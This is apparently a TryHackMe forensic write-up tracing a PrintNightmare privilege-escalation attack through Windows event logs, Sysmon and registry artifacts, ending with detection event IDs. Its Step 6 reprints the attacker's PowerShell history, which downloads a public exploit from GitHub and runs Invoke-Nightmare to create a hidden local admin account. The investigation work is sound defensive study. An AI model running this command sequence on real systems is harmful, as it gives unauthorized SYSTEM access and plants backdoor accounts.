# TryHackMe — PrintNightmare (DFIR Investigation)

## Overview

| Field         | Details                                      |
|---------------|----------------------------------------------|
| **Platform**  | TryHackMe                                    |
| **OS**        | Windows                                      |
| **Category**  | DFIR / Log Analysis                          |
| **Tools**     | FullEventLogView, ProcDOT, PowerShell        |
| **CVE**       | CVE-2021-1675 / CVE-2021-34527 (PrintNightmare) |

This room focuses on investigating a PrintNightmare attack through Windows event log analysis. The goal is to trace the full attack chain — from initial payload download to privilege escalation and persistence — using forensic artifacts.

---

## Attack Chain Summary

```
PowerShell downloads levelup.zip
        │
        ▼
Extracts CVE-2021-1675.ps1
        │
        ▼
Invoke-Nightmare executes exploit
        │
        ▼
nightmare.dll saved to Temp directory
        │
        ▼
Print Spooler (spoolsv.exe) loads DLL from spool\drivers
        │
        ▼
SYSTEM-level code execution
        │
        ▼
Local admin account "backup" created
        │
        ▼
Attacker cleans up exploit files
```

---

## Investigation Walkthrough

### Tool Setup — FullEventLogView

FullEventLogView is a NirSoft utility that displays events from all Windows event logs in a single unified table. Unlike the built-in Event Viewer, it supports powerful text-based filtering through the **Advanced Options** panel (F7), allowing searches across event IDs, providers, channels, and most importantly — the **Strings** field, which filters by text content inside event bodies.

Initial configuration:
- Launch FullEventLogView
- Set time range to **"Show events from all times"**
- Use **Advanced Options → Strings** field for targeted searches throughout the investigation

---

### Step 1 — Identifying the Downloaded File

**Filter:** Strings → `.zip`

The search revealed a Sysmon **File Create** event showing a ZIP archive downloaded via PowerShell:

```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\bmurphy\Downloads\levelup.zip
CreationUtcTime: 2021-08-27 09:52:07.311
```

**Key finding:** User `bmurphy` used PowerShell to download `levelup.zip` into the Downloads folder.

---

### Step 2 — Finding the Exploit Path

**Filter:** Strings → `C:\Users\bmurphy\`

Among the results, a **PowerShell Script Block Logging** event (Event ID 4104) revealed the full path to the exploit script:

```
Creating Scriptblock text (1 of 1):
{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}
ScriptBlock ID: f3884927-dfb0-4372-8ce5-85cb77c6b03f
Path: C:\Users\bmurphy\Downloads\CVE-2021-1675-main\CVE-2021-1675.ps1
```

**Key finding:** The exploit script was located at `C:\Users\bmurphy\Downloads\CVE-2021-1675-main\CVE-2021-1675.ps1`. The archive contained a public PrintNightmare PoC from GitHub (calebstewart/CVE-2021-1675).

---

### Step 3 — Tracing the Malicious DLL

**Filter:** Strings → `nightmare.dll`

Two critical events were found showing the DLL's journey through the system:

**3a — Temporary storage (written by PowerShell):**

```
File created:
RuleName: DLL
UtcTime: 2021-08-27 09:53:38.066
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\bmurphy\AppData\Local\Temp\3\nightmare.dll
```

**3b — Final location (loaded by Print Spooler):**

```
Process '\Device\HarddiskVolume2\Windows\System32\spoolsv.exe' (PID 2600)
would have been blocked from loading the non-Microsoft-signed binary
'\Windows\System32\spool\drivers\x64\3\nightmare.dll'
```

**Key finding:** The exploit script first wrote `nightmare.dll` to the user's Temp directory, then abused the `AddPrinterDriverEx()` API to make the Print Spooler service (`spoolsv.exe`) copy and load it from `C:\Windows\System32\spool\drivers\x64\3\`. Since spoolsv.exe runs as SYSTEM, the DLL executed with maximum privileges.

---

### Step 4 — Registry Artifacts

**Filter:** Strings → `Print\Environments\Windows`

The Print Spooler registered the malicious driver in the registry:

```
HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\THMPrinter
```

**Key finding:** The exploit created a fake printer driver named **THMPrinter** in the registry. This registry path is a reliable indicator of PrintNightmare exploitation.

---

### Step 5 — Persistence — New Admin Account

**Filter:** Event ID → `4720`

A new local user account was created immediately after exploitation:

```
Account Name: backup
```

**Key finding:** The exploit created a local administrator account named `backup` for persistent access.

---

### Step 6 — Recovering the Password (PowerShell History)

The password was not captured in event logs — PowerShell Script Block Logging recorded the module code but not the invocation parameters.

However, the **PSReadLine history file** preserved the complete command history:

```
Path: C:\Users\bmurphy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Contents revealed the full attack sequence:

```powershell
cd .\Downloads\
wget https://github.com/calebstewart/CVE-2021-1675/archive/refs/heads/main.zip -UseBasicParsing -OutFile levelup.zip
Expand-Archive .\levelup.zip -DestinationPath .
cd .\CVE-2021-1675-main\
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "backup" -NewPassword "ucGGDMyFHkqMRWwHtQ" -DriverName "THMPrinter"
net localgroup administrators
cd ..
rmdir .\CVE-2021-1675-main\
dir
del .\levelup.zip
dir
exit
```

**Key finding:** The password for the `backup` account was `ucGGDMyFHkqMRWwHtQ`. The attacker specified the driver name `THMPrinter` and verified admin group membership after exploitation.

---

### Step 7 — Anti-Forensics

The attacker attempted to cover tracks by deleting the exploit files:

```powershell
rmdir .\CVE-2021-1675-main\
del .\levelup.zip
```

**Key finding:** While the attacker removed the exploit archive and extracted folder, they failed to clear the PowerShell history file (`ConsoleHost_history.txt`), which preserved the entire attack timeline including credentials.

---

## Lessons Learned

### DFIR Takeaways

1. **PSReadLine history is a gold mine.** The file `ConsoleHost_history.txt` stores all PowerShell commands in plaintext, including passwords and parameters. Attackers frequently forget to clean it up, making it one of the most valuable forensic artifacts on Windows systems.

2. **Event logs have gaps.** PowerShell Script Block Logging (Event ID 4104) captured the module source code but not the `Invoke-Nightmare` command with its parameters. Always cross-reference multiple artifact sources.

3. **Sysmon File Create events trace the DLL lifecycle.** Sysmon captured both the initial write to Temp and the subsequent copy to the spool drivers directory, clearly showing the exploit's two-stage DLL deployment.

4. **Registry artifacts persist.** The `THMPrinter` driver entry under `HKLM\...\Print\Environments\Windows x64\Drivers\Version-3\` remained even after file cleanup, providing a durable indicator of compromise.

5. **Event ID 4720 catches account creation.** Always monitor for new account creation events — creating local admin accounts is a common persistence technique after privilege escalation.

### PrintNightmare Mechanics

- **CVE-2021-1675 / CVE-2021-34527** exploits the Windows Print Spooler service
- The `AddPrinterDriverEx()` API allows loading arbitrary DLLs through spoolsv.exe
- Since Print Spooler runs as SYSTEM, the loaded DLL inherits SYSTEM privileges
- A standard (non-admin) user can exploit this to achieve full system compromise
- Detection indicators: unexpected DLLs in `spool\drivers`, new printer drivers in registry, Event ID 4720 after Spooler activity

### Key Event IDs for PrintNightmare Detection

| Event ID | Source   | Significance                              |
|----------|----------|-------------------------------------------|
| 4104     | PowerShell | Script Block Logging — exploit code      |
| 11       | Sysmon   | File Create — DLL written to Temp/spool   |
| 13       | Sysmon   | Registry value set — printer driver entry |
| 4720     | Security | New user account created                  |
| 4732     | Security | User added to local group (Administrators)|
| 7045     | System   | New service installed                     |
